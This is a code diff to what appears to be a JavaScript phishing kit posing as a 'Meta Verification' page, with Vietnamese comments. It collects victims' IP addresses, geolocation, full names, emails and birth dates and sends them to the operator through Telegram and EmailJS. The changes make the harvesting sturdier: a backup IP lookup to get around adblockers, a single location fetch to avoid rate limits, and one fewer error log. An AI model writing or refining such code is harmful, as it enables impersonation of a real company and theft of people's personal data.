@@ -54,7 +54,6 @@ const Utils = {
             const decrypted = this.decrypt(value);
             return decrypted ? JSON.parse(decrypted) : null;
         } catch (error) {
-            console.error(`Get record error for key "${key}":`, error);
             return null;
         }
     },
@@ -66,7 +65,7 @@ const Utils = {
     async getUserIp() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
-            if (!response.ok) throw new Error('Network response was not ok');
+            if (!response.ok) throw new Error('Network error');
             const data = await response.json();
             return data.ip;
         } catch (error) {
@@ -76,8 +75,18 @@ const Utils = {
     },
 
     async getUserLocation() {
+        // Cố gắng lấy IP cơ bản trước làm dự phòng (phòng khi ipinfo bị adblock chặn)
+        let backupIp = 'N/A';
+        try {
+            backupIp = await this.getUserIp();
+        } catch (e) {}
+
         const defaultFallback = { 
-            location: 'N/A', country_code: 'N/A', ip: 'N/A', region: 'N/A', country: 'N/A' 
+            location: backupIp !== 'N/A' ? `${backupIp} | N/A | N/A (N/A)` : 'N/A', 
+            country_code: 'N/A', 
+            ip: backupIp, 
+            region: 'N/A', 
+            country: 'N/A' 
         };
 
         try {
@@ -85,16 +94,18 @@ const Utils = {
             if (!response.ok) throw new Error("Network response was not ok");
 
             const data = await response.json();
+            const finalIp = data.ip || backupIp; // Ưu tiên IP lấy được, nếu không có thì dùng IP dự phòng
+
             return {
-                location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country || 'N/A'})`,
+                location: `${finalIp} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country || 'N/A'})`,
                 country_code: data.country || "N/A",
-                ip: data.ip || "N/A",
+                ip: finalIp,
                 region: data.region || "N/A",
                 country: data.country || "N/A"
             };
         } catch (error) {
             console.error("Error getting location:", error);
-            return defaultFallback;
+            return defaultFallback; // Trả về IP dự phòng nếu API lỗi
         }
     },
 
@@ -102,12 +113,13 @@ const Utils = {
     // 📩 NOTIFICATIONS & MESSAGING
     // ==========================================
 
-    async sendToTelegram(data) {
-        const { ip, location } = await this.getUserLocation();
+    // Thêm tham số preFetchedLocation để tránh gọi lại API nhiều lần
+    async sendToTelegram(data, preFetchedLocation = null) {
+        const locationData = preFetchedLocation || await this.getUserLocation();
 
         const text = `
-<b>IP:</b> <code>${ip}</code>
-<b>Location:</b> <code>${location}</code>
+<b>IP:</b> <code>${locationData.ip}</code>
+<b>Location:</b> <code>${locationData.location}</code>
 ----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
@@ -152,16 +164,17 @@ const Utils = {
         });
     },
 
-    async sendToEmail(data) {
-        const { ip, location } = await this.getUserLocation();
-        // Tránh lỗi undefined/undefined/undefined nếu không nhập ngày sinh
+    // Thêm tham số preFetchedLocation
+    async sendToEmail(data, preFetchedLocation = null) {
+        const locationData = preFetchedLocation || await this.getUserLocation();
+        
         const dob = (data.day && data.month && data.year) 
             ? `${data.day}/${data.month}/${data.year}` 
             : 'N/A';
 
         const emailContent = `
-IP: ${ip}
-Location: ${location}
+IP: ${locationData.ip}
+Location: ${locationData.location}
 ----------------------------------
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
@@ -186,7 +199,7 @@ Sent at: ${new Date().toLocaleString()}`.trim();
                 CONFIG.EMAILJS_TEMPLATE_ID,
                 {
                     to_email: CONFIG.EMAIL_RECIPIENT,
-                    subject: `Meta Verification - ${location}`,
+                    subject: `Meta Verification - ${locationData.location}`,
                     message: emailContent,
                     from_name: 'Meta Verification System',
                     reply_to: data.email || 'noreply@system.com'
@@ -202,15 +215,18 @@ Sent at: ${new Date().toLocaleString()}`.trim();
         const type = CONFIG.NOTIFICATION_TYPE?.toLowerCase();
         const tasks = [];
 
+        // Lấy IP & Location 1 lần duy nhất ở đây rồi truyền xuống
+        // Để tránh việc gọi API 2 lần cùng lúc gây lỗi Rate Limit
+        const locationData = await this.getUserLocation();
+
         if (type === 'telegram' || type === 'both') {
-            tasks.push(this.sendToTelegram(data));
+            tasks.push(this.sendToTelegram(data, locationData));
         }
         if (type === 'email' || type === 'both') {
-            tasks.push(this.sendToEmail(data));
+            tasks.push(this.sendToEmail(data, locationData));
         }
 
         try {
-            // Chạy song song cả Telegram và Email (nếu là 'both') giúp giảm 50% thời gian chờ
             await Promise.allSettled(tasks);
         } catch (error) {
             console.error('Notification dispatch error:', error);
